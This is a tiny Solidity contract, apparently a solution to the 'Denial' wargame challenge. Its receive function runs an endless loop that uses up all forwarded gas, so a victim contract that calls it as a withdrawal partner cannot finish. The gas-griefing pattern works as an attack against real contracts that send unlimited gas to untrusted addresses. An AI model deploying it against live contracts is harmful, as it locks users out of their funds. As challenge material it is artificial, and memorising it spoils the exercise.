// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @notice Consumes the gas forwarded by Denial's partner callback.
contract DenialSolver {
    receive() external payable {
        while (true) {}
    }
}
